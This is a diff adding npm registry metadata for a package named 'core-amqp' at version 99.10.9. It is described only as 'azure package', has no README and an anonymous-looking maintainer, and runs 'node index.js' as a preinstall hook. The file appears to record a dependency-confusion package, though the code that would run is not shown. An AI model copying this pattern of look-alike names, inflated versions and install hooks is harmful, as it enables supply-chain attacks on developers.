@@ -1,0 +1,62 @@
+{
+    "_id": "core-amqp",
+    "name": "core-amqp",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "core-amqp",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "core-amqp@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-2XlvSPWoZ2pC+MokBk6ShhKX0RWT5XXL/d6wXXo1z1yIEiUyHDQE297986LWrGi/3E9tq8e2usDBatzNqGWlZw==",
+                "shasum": "4cd16306ccd3eef9b247152141866dd5295e31c9",
+                "tarball": "https://registry.npmjs.org/core-amqp/-/core-amqp-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5058,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNbvfACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmrb9A/+M1EOq3XpjVTGUqc6Btb39Aqa2DB3OXbmiVNCXcDiiuEayF1X\r\nRXWsNE+6Hos3FXAb1kBwmQ7/mXSwFi0kYDwKpV9aljQ33SuPhwnsW4cES8nb\r\nhjNBTJ4xGyYsLoFRcbcqw4SRmfskyoxCFqSEBzm3ZV7t0SDC3bK1F8Cpr+UE\r\nXWp9U0G99sX1vjcKLNPRuo9rZMMCZAUOq008pErlliL6AZl1vfSKdorV5fIE\r\ndN6eflfLKNU1Ya8hWwfSBD3NwZBT3cVOix2ViXTDvaBT9LNPVRThUMov/ZJ8\r\nCC47ZQi4Y9hIx4t9WyqgvM27BQcXfuOH73lvv7MP0BqKPQjTaIr1hOqhcO4x\r\nrxRLmKIV2IiLyyhhwSrYHGPJxyQJfcu6u9a38zKr83IjVbrM/ZqP6CfrMvR8\r\nkdPqe1mQQND2Gu8WqPJ+7sd6xBfTlzvleDIpy+EMk2cQgOSWBlLMvAeLMmIu\r\nOUiU203IC2qlapHfujQ6kPwv5COsPQjj3761RKyQOXDnEq7h+XFONd9wueIC\r\nLlZnLqO1hjjHQ5XgdIacKYRMiGLUhJ6EsuM7qFJBNQK1Pw9LgcIjNFkNdvIz\r\nmldaVv+ic3scWFZvq5BbNzeO9Dsa53KOCsw/Zugna3pdjFgfyolwCl4jgDi2\r\nKjjt+/8Gv79rN5uBP5mOdGHgqpKZL4JemIU=\r\n=CKt0\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "3vg0con8",
+                "email": "3vg0con8@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "3vg0con8",
+                    "email": "3vg0con8@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/core-amqp_99.10.9_1647688671469_0.9082605920938311"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-19T11:17:51.468Z",
+        "99.10.9": "2022-03-19T11:17:51.630Z",
+        "modified": "2022-03-19T11:17:51.729Z"
+    },
+    "maintainers": [
+        {
+            "name": "3vg0con8",
+            "email": "3vg0con8@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
